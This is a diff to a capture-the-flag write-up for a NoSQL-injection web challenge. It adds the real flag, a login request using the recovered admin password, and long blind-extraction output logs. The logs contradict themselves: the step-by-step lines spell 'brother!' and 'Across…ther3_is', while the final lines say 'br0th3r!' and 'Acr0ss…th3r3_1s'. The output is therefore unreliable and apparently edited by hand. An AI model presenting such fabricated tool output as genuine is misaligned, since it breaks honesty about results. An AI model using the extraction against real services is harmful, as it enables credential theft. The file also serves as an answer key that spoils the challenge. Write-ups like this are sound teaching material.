@@ -1,7 +1,7 @@
 # NoSQL True Warrior — Writeup
 
 **Category:** Web
-**Flag:** `Pioneers25{dummy_flag}` *(varies per deployment)*
+**Flag:** `Pioneers25{F4r_t0_th3_w3st_Acr0ss_th3_s3a_th3r3_1s_4_laNd_c4ll3d_Vinland}`
 
 ---
 
@@ -207,7 +207,16 @@ password = extract_password()
 [+] Password so far: Y0U_H4v3_n0_3n3m1
 [+] Password so far: Y0U_H4v3_n0_3n3m1e
 [+] Password so far: Y0U_H4v3_n0_3n3m1es
-[✓] Complete password: Y0U_H4v3_n0_3n3m1es
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_b
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_br
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_bro
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_brot
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_broth
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_brothe
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_brother
+[+] Password so far: Y0U_H4v3_n0_3n3m1es_brother!
+[✓] Complete password: Y0U_H4v3_n0_3n3m1es_br0th3r!
 ```
 
 ---
@@ -222,7 +231,7 @@ response = session.post(
     f"{BASE}/login",
     data={
         "username": "admin",
-        "password": "Y0U_H4v3_n0_3n3m1es"
+        "password": "Y0U_H4v3_n0_3n3m1es_br0th3r!"
     },
     allow_redirects=False
 )
@@ -265,18 +274,68 @@ flag = extract_flag(session)
 
 **Output:**
 ```
-[+] Flag so far: Pioneers25{d
-[+] Flag so far: Pioneers25{du
-[+] Flag so far: Pioneers25{dum
-[+] Flag so far: Pioneers25{dumm
-[+] Flag so far: Pioneers25{dummy
-[+] Flag so far: Pioneers25{dummy_
-[+] Flag so far: Pioneers25{dummy_f
-[+] Flag so far: Pioneers25{dummy_fl
-[+] Flag so far: Pioneers25{dummy_fla
-[+] Flag so far: Pioneers25{dummy_flag
-[+] Flag so far: Pioneers25{dummy_flag}
-[✓] Complete flag: Pioneers25{dummy_flag}
+[+] Flag so far: Pioneers25{F
+[+] Flag so far: Pioneers25{F4
+[+] Flag so far: Pioneers25{F4r
+[+] Flag so far: Pioneers25{F4r_
+[+] Flag so far: Pioneers25{F4r_t
+[+] Flag so far: Pioneers25{F4r_t0
+[+] Flag so far: Pioneers25{F4r_t0_
+[+] Flag so far: Pioneers25{F4r_t0_th
+[+] Flag so far: Pioneers25{F4r_t0_th3
+[+] Flag so far: Pioneers25{F4r_t0_th3_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3s
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_A
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Ac
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Acr
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Acro
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Acros
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_t
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_t
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_th
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_the
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_i
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_l
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_la
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laN
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4l
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_V
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vi
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vin
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vinl
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vinla
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vinlan
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vinland
+[+] Flag so far: Pioneers25{F4r_t0_th3_w3st_Across_th3_s3a_ther3_is_4_laNd_c4ll3d_Vinland}
+[✓] Complete flag: Pioneers25{F4r_t0_th3_w3st_Acr0ss_th3_s3a_th3r3_1s_4_laNd_c4ll3d_Vinland}
 ```
 
 ---
